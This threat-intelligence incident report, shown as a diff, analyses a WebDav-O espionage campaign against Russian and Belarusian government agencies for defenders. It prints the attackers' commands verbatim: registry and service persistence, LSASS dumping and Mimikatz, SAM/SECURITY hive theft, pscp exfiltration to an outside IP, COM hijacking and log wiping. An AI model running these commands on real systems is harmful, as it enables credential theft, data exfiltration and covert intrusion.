@@ -1,0 +1,253 @@
+Incident 1. Russia and Belarus
+Victim summary
+Contents 11
+Industry
+Government
+Incident description
+Countries affected
+Russia, Belarus
+Threat
+WebDav-O
+In 2022, our systems detected an attack employing malware known as WebDav-O that targeted a government
+agency in Russia. Several researchers had previously described a series of attacks using WebDav-O and
+Mail-O. We were able to track the activity of the WebDav-O implant in our telemetry at least until 2018. This
+activity was aimed at government-linked targets located in Belarus. Based on our research, we were able to
+find additional variants of the malware and observe commands executed by the attackers on compromised
+hosts.
+Detailed description
+Exploit Public-Facing Application T1190 (Initial access)
+To get initial access to the victim, the attacking group exploited a vulnerability in IIS Windows Server. We
+observed the following activity in Windows logs: The IIS Worker process w3wp.exe ran the malicious files of the
+attackers.
+After successful infection, a malicious library was uploaded into one of the following directories:
+С:\Windows\System32\logfiles
+С:\Windows\System32\
+As part of the malware deployment process, APT actors usually create a Windows service Create or Modify
+System Process: Windows Service T1543.003. A rather unusual operation in this incident was when the
+attacker changed a registry key so that the malicious DLL was run with the command line "svchost.exe -k
+netsvcs", which looks legitimate:
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v
+netsvcs /t REG_MULTI_SZ /d AeLookupSvc\0 ... \0SQLReader
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 1. Russia and Belarus
+Contents 12
+After adding an additional value for the HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost\
+netsvcs registry key, the attacker created a new Windows service named SQLReader with the executable file
+"svchost.exe -k netsvcs".
+sc create SQLReader binpath= "С:\Windows\System32\svchost.exe -k netsvcs" start= auto
+displayname= "SQL Server VSS Reader"
+They then added a description of the service, the path to the malicious DLL to the corresponding registry key
+for SQLReader, and started the service using sc.exe:
+reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SQLReader /v Description /t
+REG_SZ /d "SQL Server VSS Reader"
+reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SQLReader\Parameters /v
+ServiceDll /t REG_EXPAND_SZ /d "С:\Windows\System32\sqlrder.dll"
+sc start SQLReader
+sqlrder.dll (MD5: 69B99401A0BBBF7BEC1B27DCE12C8B3A) is one of the WebDav-O implants that
+communicates with Yandex Disk, just like other implant variants communicate with DropBox and Mail.ru C2.
+Attackers use these implants to receive commands and to export their results. This is an example of the
+technique known as Web Service: Bidirectional Communication T1102.002.
+During our investigation, we used the Kaspersky Threat Intelligence Portal to check the URL that was
+contacted by the process and found additional malicious executables that communicated with this URL.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 1. Russia and Belarus Contents 13
+Figure 4 List of malware communicating with the malicious URL
+When searching for objects associated with sqlrder.dll in Kaspersky TIP, the Research Graph tool showed a link
+with the APT group known as CoughingDown.
+One malware used by CoughingDown is a network sniffer and loading module (MD5:
+B00EA7F6025D1FC709A4F2B02A9EF3A0) that has common characteristics with the Mail-O variant. Both
+use a cloud platform for data exfiltration by simultaneously sending the data during predetermined working
+hours (from 9:00 to 17:00 for the CoughingDown variant, and from 9:00 to 16:00 for Mail-O). Additionally, the
+filename format of the heartbeat file created by Mail-O ([MMDDhhmmss].dat) is similar
+to the format of a file created by CoughingDown and uploaded to Yandex Disk: STATE_HEX-HOSTNAME
+HHMMSSmmm.dat.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 1. Russia and Belarus
+Figure 5
+Threat Intelligence Portal connections graph
+Contents 14
+The WebDav-O variant observed in this incident uses the Yandex Disk cloud service to host files with
+commands for the implant. After gaining access to a given storage account using hard-coded credentials,
+the malware can negotiate an encryption session key and subsequently read and process command files
+encrypted with this key. The contents of these files then allow the operators to upload and download files
+from the target file system, and to use the file system to execute arbitrary commands from the command shell
+(cmd.exe) on it.
+Files containing commands are received from Yandex Disk as follows.
+After authentication of 'GET webdav.yandex.ru/?userinfo' and generation of a session key, the malware checks
+the network connection using GET webdav.yandex.ru/test3.txt, then executes the specialized Webdav method
+PROPFIND webdav.yandex/test, which receives an XML file in response. This XML file contains multiple paths
+to data resources, and each set of data is extracted using a GET request and decrypted using the session key
+mentioned above. The decrypted data of each request represents a command that should be executed by
+malware. After execution, the resource will be deleted from Yandex Disk via an HTTP DELETE request in which
+the resource path is specified as an argument.
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 1. Russia and Belarus
+Here are the commands that we tracked.
+First the attacker executed a series of ping commands:
+cmd.exe /c C: & cd\ & cd "" & ping  -n 1
+Then viewed the connected network drives:
+cmd.exe /c C: & cd\ & cd "" & net use
+Contents 15
+Then the operator attempted to connect to remote hosts via SMB using a compromised account:
+cmd.exe /c C: & cd\ & cd "" & net use \ /u:\ 
+The operator also conducted reconnaissance on remote hosts by using the wmic.exe:
+cmd.exe /c C: & cd\ & cd "" & wmic /node: /user:\ /password:
+process call create ""
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 1. Russia and Belarus
+Contents 16
+All discovery commands that were executed by the attackers on local and remote
+systems are listed in the table below.
+MITRE ATT&CK Commands
+matrix technique
+hostname
+System Network Configuration Discovery systeminfo
+cmd /c echo list volume |diskpart
+route print
+System Network Configuration Discovery tracert -h 2 
+ipconfig /displaydns
+qwinsta
+System Network Connections Discovery netstat -ano
+System Time Discovery time /t
+Query Registry
+Process Discovery
+reg query
+hku\\Software\Microsoft\Office\14.0\
+Outlook /s | find ""
+cmd /c tasklist
+wmic process | find ""
+ping -n 1 administrators
+ping -n 1 admin-pc
+ping -n 1 dc01
+ping 
+C:\Windows\System32\logfiles\portscan.exe -h [REDACTED] -p
+22 C:\Windows\System32\logfiles\portscan.exe -h [REDACTED]
+-p 25,110
+cmd.exe /c C: & cd\ & cd "Windows\web" & C:\Windows\
+System32\logfiles\nbtscan.exe [REDACTED]
+cmd /c wmic product get name
+Remote System Discovery
+dir \\c$\windows\system32\tasks
+Software Discovery net use
+cmd.exe /C net group "domain admins" /domain"
+Network Share Discovery
+cmd.exe /C net group /do
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 1. Russia and Belarus
+MITRE ATT&CK Commands
+matrix technique
+dir
+File and Directory Discovery dir \\c$\"program files" /od
+dir \\c$\"program files (x86)" /od
+Permission Groups Discovery net group "domain computers" /do
+nltest /dclists
+Domain Trust Discovery nltest /domain_trusts
+nltest /dclist:
+Contents 17
+The output results of the discovery were saved to %temp%\temp.txt. The attacker read these results and then
+deleted them:
+cmd.exe /c C: & cd\ & cd "" & type \\c$\windows\temp\temp.txt
+cmd.exe /c C: & cd\ & cd "" & del \\c$\windows\temp\temp.txt
+Extraction of test.rar:
+cmd /c $temp\rar e test.rar -p >$temp\temp.txt
+Running malware on a remote system — Masquerading: Masquerade Task or Service T1036.004:
+cmd.exe /c C: & cd\ & cd "" & dir \\c$\windows\system32\conhost64.exe
+cmd.exe /c C: & cd\ & cd "" & wmic /node: /user:\ /password:
+process call create "cmd /c $system32\conhost64.exe"
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 1. Russia and Belarus
+Contents 18
+After the Discovery process, the attackers attempted to gather data from the current host and from remotely
+connected hosts — Data from Local System T1005.
+cmd.exe /c C: & cd\ & cd "windows\temp" & dir rar*
+cmd.exe /c C: & cd\ & cd "windows\temp" & dir "$programfiles\winrar\rar.exe"
+Archiving on remote systems:
+rar a -r 123.rar \\c$\users\\desktop* -hp -ta20220302
+\\c$\program files\winrar\rar.exe" a -r -m5 -hp \\c$\windows\temp\sduid.sys
+\\c$\users\\desktop\*
+Another important stage of the attack is obtaining user credentials. User credentials allow attackers to elevate
+their privileges and move laterally through the network. In this incident, we observed activity of the procdump.
+exe tool, which can be used to create a memory dump of the lsass.exe process — OS Credential Dumping:
+LSASS Memory T1003.001.
+procdump.exe -accepteula -ma lsass.exe С:\Windows\Temp\mem.dmp
+We also observed the msdol.exe process with arguments that are typical of Mimikatz:
+С:\Windows\System32\logfiles\msdol.exe privilege::debug sekurlsa::logonpasswords exit
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 1. Russia and Belarus
+To obtain user credentials from remote hosts, the attackers used the following techniques:
+• OS Credential Dumping: Security Account Manager T1003.002
+• OS Credential Dumping: LSA Secrets T1003.004
+• OS Credential Dumping: Cached Domain Credentials T1003.005
+Contents 19
+Using the wmic and reg save commands, they saved the registry hives containing account credentials (SAM,
+SECURITY, and SYSTEM) to the Windows temp folder:
+wmic /node:[REDACTED] /user:[REDACTED] /password:[REDACTED] process call create "cmd.exe /c
+reg save HKLM\sam С:\Windows\Temp\sam.save"
+wmic /node:[REDACTED] /user:[REDACTED] /password:[REDACTED] process call create "cmd.exe /c
+reg save HKLM\security С:\Windows\Temp\security.save"
+wmic /node:[REDACTED] /user:[REDACTED] /password:[REDACTED] process call create "cmd.exe /c
+reg save HKLM\system С:\Windows\Temp\system.save"
+In addition to wmic.exe, the attackers also used PsExec to move through the network:
+psexec.exe \[REDACTED]\ cmd /c "systeminfo > С:\Windows\help\123.txt"
+psexec.exe \[REDACTED]\ cmd /c "ping dropbox.com -n 1 > С:\Windows\help\123.txt"
+psexec.exe \[REDACTED]\ cmd /c "ping mail.ru -n 1 > С:\Windows\help\123.txt"
+psexec.exe -s \[REDACTED] cmd /c "PowerShell -psconsolefile "C:\Program Files\Microsoft\Exchange
+Server\v15\bin\exshell.psc1" Get-MailBox > С:\Windows\Temp\1.txt
+After saving the files containing credentials, the attackers added them to an archive and then sent them to the
+C2 server — Exfiltration Over C2 Channel T1041:
+rar.exe a 162.rar -r "\[REDACTED]\С:\Windows\Temp*.save" -p
+pscp.exe -P 8443 -pw [REDACTED] С:\Windows\System32\logfiles\162.rar root@5.183.103[.]181:/
+root/162.rar
+С:\Windows\System32\logfiles\rar.exe a С:\Windows\Temp\vpp.rar С:\Windows\Temp*.kdbx hp
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 1. Russia and Belarus
+Contents 20
+The attackers used a customized tool called HTran [1] . HTran is an open source tool for port forwarding that is
+available on GitHub. The HTran tool used in this attack appears to be an adapted version of the tool found on
+GitHub because it has an additional parameter for the "-tran" option: The standard "-tran" option supports 3
+parameters, while a fourth "LocalIpAddress" parameter is available in this example. This parameter allows you
+to specify the local IP address binding for port forwarding. By default, HTran binds to all interfaces (INADDR_
+ANY). In this configurable version, the attacker can specify which interface the proxy is bound to.
+While analyzing logs during the incident investigation, we observed use of the COM Hijacking technique (Event
+Triggered Execution: Component Object Model Hijacking T1546.015). This technique lets attackers execute
+arbitrary code in the address space of a trusted process. For COM Hijacking, attackers use the following
+registry keys depending on the particular deployment scenario: InprocServer(32), LocalServer(32), TreatAs, or
+ProgID in the HKCU\Software\Classes\CLSID\ registry hives.
+In this incident, the attackers ran a malicious executable that had already been downloaded to the system
+(MD5: 0024EE86702EE9234771731975E9EE47):
+cmd.exe С:\Windows\system32\i.exe С:\Windows\system32\2.bin
+The process ran the file $appdata\brmsl.exe.mui (2.bin - MD5: 123FD2B1D1C1A03227B0E75572082436), using
+rundll32.exe:
+cmd.exe /c rundll32.exe $appdata\brmsl.exe.mui StartNow
+It also set this file as the registry key value for the COM object Shell Rebar BandSite, which corresponds to the
+DLL file С:\Windows\system32\explorerframe.dll:
+Registry Key: $hkcu\software\classes\clsid{ecd4fc4d-521c-11d0-b792-00a0c90312e1}\inprocserver32
+Registry Value: $appdata\brmsl.exe.mui
+The COM Object that was abused: Shell Rebar BandSite
+The legitimate DLL that was hijacked: С:\Windows\system32\explorerframe.dll
+1
+HTran
+Learn more
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 1. Russia and Belarus
+Contents 21
+Throughout the entire operation, the attackers periodically deleted system logs by using wevtutil — Indicator
+Removal: Clear Windows Event Logs T1070.001:
+wevtutil cl system
+wevtutil cl security
+wevtutil cl application
+Summary
+The described activity was part of a prolonged campaign aimed at one of Russia's government agencies.
+According to our telemetry, this malware was also used against entities located in Belarus and primarily
+targeted its government agencies. This activity has some links to the group known as CoughingDown. The
+group responsible for this operation displays a high level of motivation. Their main goal is to persistently reside
+in the infrastructure and conduct espionage.
+Download techniques in JSON format for MITRE Navigator:
+Learn more
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Incidents involving Asian APT groups in various regions of the planet  |  Incident 1. Russia and Belarus Contents 22
+Figure 6
+Threat Landscape page interface in TIP
+Modern Asian APT Groups: Tactics, Techniques and Procedures
+Contents 23
+Incidents involving Asian APT groups in various regions of the planet
